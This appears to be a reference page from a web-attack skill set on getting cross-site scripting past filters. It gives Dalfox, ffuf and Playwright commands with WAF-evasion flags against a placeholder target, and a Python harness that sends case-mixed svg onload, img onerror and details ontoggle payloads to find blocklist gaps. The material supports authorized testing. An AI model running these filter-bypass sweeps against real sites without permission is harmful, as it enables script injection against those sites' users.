# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`cross-site-scripting-filter-and-context-bypass`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `Dalfox` | `dalfox url 'https://target.example/note?text=kY9' --waf-evasion` | Generate context-matched equivalence-class variants and test which pass the filter | Linux, macOS, Windows |
| `ffuf` | `ffuf -u 'https://target.example/note?text=FUZZ' -w xss-variants.txt -mr kY9` | Sweep an equivalence-class wordlist and match responses where the marker survives | Cross-platform |
| `Playwright` | `npx playwright open https://target.example/note` | Confirm a surviving variant actually executes at the sink in a real browser | Cross-platform |

## Minimal Script Shape

An equivalence-class harness: it submits case, alternate-element, and encoded variants of a marker and reports which reach the response body with their handler intact, indicating a blocklist gap.

```python
import urllib.parse
import urllib.request

BASE = "https://target.example/note"
MARKER = "kY9"

def survives(payload):
    url = BASE + "?" + urllib.parse.urlencode({"text": payload})
    with urllib.request.urlopen(url, timeout=10) as r:
        body = r.read().decode("utf-8", "replace")
    return MARKER in body and "on" in body.lower()

variants = {
    "mixed_case_svg": "<SvG OnLoad=" + MARKER + ">",
    "img_onerror": "<img src=x onerror=" + MARKER + ">",
    "details_ontoggle": "<details open ontoggle=" + MARKER + ">",
}
results = {k: survives(v) for k, v in variants.items()}
# a variant that reaches the body with its handler intact flags an incomplete blocklist
print({"survivors": [k for k, ok in results.items() if ok], "raw": results})
```
